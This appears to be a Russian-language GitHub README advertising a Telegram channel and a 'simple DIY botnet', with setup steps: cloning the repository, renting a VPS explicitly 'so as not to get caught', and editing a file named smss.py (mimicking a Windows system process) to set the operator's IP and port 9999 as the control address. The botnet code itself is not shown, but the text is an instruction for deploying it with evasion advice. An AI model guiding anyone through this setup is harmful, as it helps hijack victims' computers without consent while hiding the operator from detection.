<h1 align="center">Подпишись на мой телеграмм <a href="https://t.me/samurai_figure" target="_blank">N∆RI</a> 
<img src="https://github.com/blackcater/blackcater/raw/main/images/Hi.gif" height="32"/></h1>
<h3 align="center">Простой бот-нет своими руками ot N∆RI</h3>
Можно также использовать как панель для VPS ботнета <br>
Клонируем гит <br>
git clone https://github.com/Samuraianonweb/bot
<br>
cd bot
<br>
Чтобы не попасться , лучше использовать VPS<br>

Чтобы узнать свой(VPS) ip $ ifconfig <br>
Редактируем файл smss.py

<br>
run=False
	def __init__(self, connect:Tuple[str,int]=("вставляем свой ip",9999)) -> None:
<br>

